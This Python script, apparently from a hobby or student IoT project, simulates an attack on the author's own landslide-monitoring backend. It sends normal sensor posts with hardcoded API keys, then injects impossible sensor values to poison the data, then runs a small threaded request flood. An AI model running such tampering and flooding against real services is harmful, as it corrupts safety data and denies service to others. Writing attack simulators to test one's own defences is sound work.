import time
import requests
import json
import random
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# GAIA - MALICIOUS ATTACK SIMULATOR
# ==========================================

BACKEND_URL = "https://iot-security-068d.onrender.com"  # Hitting the live cloud server

# TARGET SELECTION (Choose whether to target your physical hardware or virtual simulator)
TARGET_HARDWARE = True  # Set to True to attack your physical Pi, False to simulate virtual pi-node-2

if TARGET_HARDWARE:
    NODE_ID = "pi-node-1"   # Targets your real physical Raspberry Pi!
    API_KEY = "secret123"
else:
    NODE_ID = "pi-node-2"   # Simulates a virtual node
    API_KEY = "secret456"

def print_attacker(msg, color="white"):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "cyan": "\033[96m",
        "white": "\033[0m"
    }
    print(f"{colors.get(color, '')}{msg}\033[0m")

def send_payload(payload):
    try:
        response = requests.post(f"{BACKEND_URL}/sensor-data", json=payload, timeout=2)
        return response.status_code, response.text
    except Exception as e:
        return 0, str(e)

def phase_1_stealth():
    print_attacker("\n=== [PHASE 1] STEALTH INFILTRATION ===", "cyan")
    print_attacker("Sending normal data to establish trust...", "white")
    
    for i in range(3):
        payload = {
            "node_id": NODE_ID,
            "api_key": API_KEY,
            "motion": 0,
            "temperature": 24.5,
            "moisture": 25.5,
            "shake": 1,
            "tilt": 0.5,
            "sound": 40.0,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        status, text = send_payload(payload)
        print_attacker(f"[>] Stealth Payload {i+1} sent. Response: {status}", "green")
        time.sleep(1)

def phase_2_poisoning():
    print_attacker("\n=== [PHASE 2] DATA POISONING (TAMPERING) ===", "yellow")
    print_attacker("Injecting physically impossible values to crash Landslide AI...", "white")
    time.sleep(2)
    
    payload = {
        "node_id": NODE_ID,
        "api_key": API_KEY,
        "motion": 1,
        "temperature": 999.0, # Impossible
        "moisture": -500.0, # Impossible (0-100)
        "shake": 9999,
        "tilt": 999.0, # Impossible (-180 to 180)
        "sound": 9999.0,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }
    status, text = send_payload(payload)
    print_attacker(f"[>] Malicious Payload sent. Response: {status} - {text}", "red")
    
def phase_3_ddos():
    print_attacker("\n=== [PHASE 3] PANIC DDoS FLOODING ===", "red")
    print_attacker("Backend likely caught us. Flooding API to cause denial of service...", "white")
    time.sleep(2)
    
    def flood_task(i):
        payload = {
            "node_id": NODE_ID,
            "api_key": API_KEY,
            "motion": 0, "temperature": 25.0, "moisture": 50.0, "shake": 0, "tilt": 0.0, "sound": 30.0, "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        status, _ = send_payload(payload)
        return status

    # Send 30 requests rapidly
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(flood_task, range(30)))
    
    success = results.count(200)
    blocked = results.count(403)
    
    print_attacker(f"[*] Flood Complete. Successful: {success}, Blocked: {blocked}", "cyan")

if __name__ == "__main__":
    print_attacker("--- PROJECT GAIA MITM ATTACK SCRIPT ---", "cyan")
    
    phase_1_stealth()
    time.sleep(2)
    
    phase_2_poisoning()
    time.sleep(3)
    
    phase_3_ddos()
    
    print_attacker("\n--- ATTACK SEQUENCE COMPLETE ---", "cyan")
